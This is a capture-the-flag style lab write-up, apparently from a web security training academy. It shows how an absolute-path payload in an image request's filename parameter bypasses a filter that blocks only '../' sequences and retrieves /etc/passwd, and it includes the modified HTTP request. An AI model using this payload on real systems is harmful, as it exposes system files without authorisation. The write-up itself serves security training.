# Lab: File Path Traversal, Traversal Sequences Blocked with Absolute Path Bypass

## Objective

Exploit the path traversal vulnerability in the product image functionality to retrieve the contents of the `/etc/passwd` file.

## Vulnerability

The application blocks directory traversal sequences such as `../`, but it treats the supplied filename as being relative to a default working directory. This allows an attacker to bypass the restriction by specifying an absolute path.

## Lab :Steps 

1. Open the lab and navigate to any product page.
2. Intercept the request for the product image using **Burp Suite**.
3. Identify the request containing the `filename` parameter.

### Original Request

```http
GET /image?filename=218.png HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
```

4. Modify the `filename` parameter to:

```text
/etc/passwd
```

### Modified Request

```http
GET /image?filename=/etc/passwd HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
```

5. Forward the request.


The server returns the contents of the `/etc/passwd` file, confirming that the application is vulnerable to Path Traversal.


## Payload Used

```text
/etc/passwd
```
## Explanation

Although the application blocks traversal sequences such as `../`, it fails to prevent the use of absolute paths. By supplying `/etc/passwd`, the attacker directly references the target file from the filesystem root, bypassing the traversal sequence filter.


